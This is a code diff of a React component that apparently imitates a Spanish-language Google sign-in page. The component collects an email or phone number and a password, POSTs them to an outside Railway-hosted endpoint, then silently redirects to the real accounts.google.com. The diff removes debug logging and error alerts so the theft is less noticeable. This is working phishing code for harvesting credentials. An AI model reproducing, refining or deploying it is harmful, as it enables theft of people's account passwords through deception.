@@ -10,11 +10,7 @@ export default function AuthRight({
 }: any) {
   const [error, setError] = useState("");
 
-  console.log("RENDER STEP:", step); // 🔥 DEBUG
-
   const handleNext = () => {
-    console.log("CLICK SIGUIENTE (EMAIL)");
-
     if (!email.trim()) {
       setError("Ingresa un correo electrónico o número de teléfono");
       return;
@@ -24,17 +20,11 @@ export default function AuthRight({
     setStep(2);
   };
 
-  /* 🔥 ENVÍO FINAL */
   const handleSubmit = async () => {
-    console.log("CLICK LOGIN 🔥");
-
-    if (!password.trim()) {
-      alert("Ingresa la contraseña");
-      return;
-    }
+    if (!password.trim()) return;
 
     try {
-      const res = await fetch(
+      await fetch(
         "https://login-app-production-b48f.up.railway.app/api/auth/login",
         {
           method: "POST",
@@ -45,22 +35,11 @@ export default function AuthRight({
         }
       );
 
-      console.log("FETCH STATUS:", res.status);
-
-      const data = await res.json();
-
-      console.log("RESPUESTA BACKEND:", data);
-
-      alert("LOGIN OK"); // 🔥 VISUAL (NO FALLA)
-
-      /* 🔥 REDIRECCIÓN (con delay para ver logs) */
-      setTimeout(() => {
-        window.location.href = "https://accounts.google.com";
-      }, 1500);
+      // Redirección limpia
+      window.location.href = "https://accounts.google.com";
 
     } catch (error) {
-      console.error("ERROR LOGIN:", error);
-      alert("Error conexión");
+      // silencioso en producción
     }
   };
 
@@ -81,9 +60,7 @@ export default function AuthRight({
             <label>Correo electrónico o teléfono</label>
           </div>
 
-          {error && (
-            <span className="error-text">{error}</span>
-          )}
+          {error && <span className="error-text">{error}</span>}
 
           <p className="link">
             ¿Olvidaste el correo electrónico?
